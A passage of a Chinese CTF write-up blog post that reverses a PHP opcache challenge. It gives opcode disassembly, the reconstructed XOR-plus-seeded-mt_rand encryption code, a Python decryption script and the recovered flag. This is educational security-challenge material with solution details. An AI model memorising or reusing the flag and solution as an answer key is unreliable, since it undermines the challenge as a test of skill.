class="line">&#125;</span><br><span class="line"></span><br><span class="line">#0 ASSIGN(None, &apos;input_your_flag_here&apos;);</span><br><span class="line">#1 DO_FCALL_BY_NAME(None, &apos;encrypt&apos;);</span><br><span class="line">#2 SEND_VAL(&apos;this_is_a_very_secret_key&apos;, None);</span><br><span class="line">#3 (117)?(None, None);</span><br><span class="line">#4 (130)?(None, None);</span><br><span class="line">#5 IS_IDENTICAL(None, &apos;85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab&apos;);</span><br><span class="line">#6 JMPZ(None, -&gt;-136);</span><br><span class="line">#7 ECHO(&apos;Congratulation! You got it!&apos;, None);</span><br><span class="line">#8 EXIT(None, None);</span><br><span class="line">#9 ECHO(&apos;Wrong Answer&apos;, None);</span><br><span class="line">#10 EXIT(None, None);</span><br></pre></td></tr></table></figure>
+<p>官方逆向后的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    $hex=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($string); $i++)&#123;</span><br><span class="line">        $tmp = dechex(ord($string[$i]));</span><br><span class="line">        <span class="keyword">if</span>(strlen($tmp) == <span class="number">1</span>)&#123;</span><br><span class="line">            $hex .= <span class="string">"0"</span> . $tmp;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $hex .= $tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($pwd, $data)</span></span>&#123;</span><br><span class="line">    mt_srand(<span class="number">1337</span>);</span><br><span class="line">    $cipher = <span class="string">""</span>;</span><br><span class="line">    $pwd_length = strlen($pwd);</span><br><span class="line">    $data_length = strlen($data);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $data_length; $i++) &#123;</span><br><span class="line">        $cipher .= chr(ord($data[$i]) ^ ord($pwd[$i % $pwd_length]) ^ mt_rand(<span class="number">0</span>, <span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> encode($cipher);</span><br><span class="line">&#125;</span><br><span class="line">$flag = <span class="string">"input_your_flag_here"</span>;</span><br><span class="line"><span class="keyword">if</span>(encrypt(<span class="string">"this_is_a_very_secret_key"</span>, $flag) === <span class="string">"85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab"</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Congratulation! You got it!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wrong Answer"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+<p>我们将代码分解开来进行分析，首先是encode()函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    $hex=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($string); $i++)&#123;</span><br><span class="line">        $tmp = dechex(ord($string[$i]));</span><br><span class="line">        <span class="keyword">if</span>(strlen($tmp) == <span class="number">1</span>)&#123;</span><br><span class="line">            $hex .= <span class="string">"0"</span> . $tmp;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $hex .= $tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们发现该函数是将$string的每一位转换为ASCII码后，再转换为十六进制，如果转换的十六进制位数是一位的话就在前面添0，然后将每一位的十六进制拼接起来。</p>
+<p>我们再来看encrypt函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($pwd, $data)</span></span>&#123;</span><br><span class="line">    mt_srand(<span class="number">1337</span>);</span><br><span class="line">    $cipher = <span class="string">""</span>;</span><br><span class="line">    $pwd_length = strlen($pwd);</span><br><span class="line">    $data_length = strlen($data);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $data_length; $i++) &#123;</span><br><span class="line">        $cipher .= chr(ord($data[$i]) ^ ord($pwd[$i % $pwd_length]) ^ mt_rand(<span class="number">0</span>, <span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> encode($cipher);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先是一个随机数发生器种子，在这里pwd我们是已知的，因此长度也是已知量,data是我们要得到的flag，data的长度也是未知量，在for循环中我们看到有一条异或的语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cipher .= chr(ord($data[$i]) ^ ord($pwd[$i % $pwd_length]) ^ mt_rand(<span class="number">0</span>, <span class="number">255</span>));</span><br></pre></td></tr></table></figure>
+<p>这句话其实是可逆的，因此得出</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(ord($data[$i])= $cipher[$i] ^ ord($pwd[$i % $pwd_length]) ^ mt_rand(<span class="number">0</span>, <span class="number">255</span>));</span><br></pre></td></tr></table></figure>
+<p>由最后的if判断我们可以得到，加密后的密文长度为74位，因此我们根据encode()函数可以得出flag的长度是37位，因此我们的mt_rand()生成的随机数至少应该是37位，因此我们利用python编写解密脚本如下。</p>
+<p>python版本：2.x</p>
+<p>php版本：php7.2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwd=<span class="string">"this_is_a_very_secret_key"</span></span><br><span class="line">rand=[<span class="number">151</span>,<span class="number">189</span>,<span class="number">92</span>,<span class="number">232</span>,<span class="number">167</span>,<span class="number">217</span>,<span class="number">167</span>,<span class="number">90</span>,<span class="number">114</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">72</span>,<span class="number">9</span>,<span class="number">134</span>,<span class="number">182</span>,<span class="number">90</span>,<span class="number">23</span>,<span class="number">152</span>,<span class="number">129</span>,<span class="number">27</span>,<span class="number">93</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">114</span>,<span class="number">194</span>,<span class="number">105</span>,<span class="number">104</span>,<span class="number">203</span>,<span class="number">65</span>,<span class="number">60</span>,<span class="number">215</span>,<span class="number">147</span>,<span class="number">238</span>,<span class="number">81</span>,<span class="number">111</span>,<span class="number">91</span>,<span class="number">179</span>,<span class="number">57</span>,<span class="number">195</span>]</span><br><span class="line">sec=<span class="string">"85b954fc8380a466276e4a48249ddd4a199fc34e5b061464e4295fc5020c88bfd8545519ab"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">37</span>):</span><br><span class="line">    flag+=chr(rand[i]^ord(sec[i])^ord(pwd[i%len(pwd)]))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0pc4che_b4ckd00r_is_4_g0o6_ide4&#125;</span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+</ul>
+<ul>
+<li><h3 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h3><p><a href="http://www.laruence.com/2008/06/18/221.html" target="_blank" rel="noopener">http://www.laruence.com/2008/06/18/221.html</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/web-15450.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/web-15450.html</a></p>
+<p><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=626</a></p>
+<p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p>
+<p><a href="https://blog.csdn.net/sqzxwq/article/details/47786345" target="_blank" rel="noopener">https://blog.csdn.net/sqzxwq/article/details/47786345</a></p>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/03/SQL注入下的bypass/" rel="next" title="SQL注入下的bypass">
+                <i class="fa fa-chevron-left"></i> SQL注入下的bypass
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/28/phpstorm在phpstudy环境下的debug/" rel="prev" title="phpstorm在phpstudy环境下的debug">
+                phpstorm在phpstudy环境下的debug <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Caoyifan</p>
+              <p class="site-description motion-element" itemprop="description">web漏洞 代码审计 xss</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/elssm" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://elssm.lofter.com" target="_blank" title="Lofter">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Lofter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#写在前面"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。"><span class="nav-number">2.0.1.</span> <span class="nav-text">我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#启动docker"><span class="nav-number">2.0.2.</span> <span class="nav-text">启动docker</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#将题目源码拉到本地，使用git-clone命令"><span class="nav-number">2.0.3.</span> <span class="nav-text">将题目源码拉到本地，使用git clone命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修改Dockerfile文件，在文件中添加一行，用来创建sandbox文件夹"><span class="nav-number">2.0.4.</span> <span class="nav-text">修改Dockerfile文件，在文件中添加一行，用来创建sandbox文件夹</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#进入到source文件夹创建镜像"><span class="nav-number">2.0.5.</span> <span class="nav-text">进入到source文件夹创建镜像</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#启动环境，这里的8585端口可以设置为任意一个未被占用的端口"><span class="nav-number">2.0.6.</span> <span class="nav-text">启动环境，这里的8585端口可以设置为任意一个未被占用的端口</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#之后访问http-ip-8585即可"><span class="nav-number">2.0.7.</span> <span class="nav-text">之后访问http://ip:8585即可</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#源码分析"><span class="nav-number">3.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用”-”绕过上传检测"><span class="nav-number">4.</span> <span class="nav-text">利用”/.”绕过上传检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用”test-index-php-”上传覆盖"><span class="nav-number">5.</span> <span class="nav-text">利用”test/../index.php/.”上传覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#opcode反编译"><span class="nav-number">6.</span> <span class="nav-text">opcode反编译</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#资料"><span class="nav-number">7.</span> <span class="nav-text">资料</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Caoyifan</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
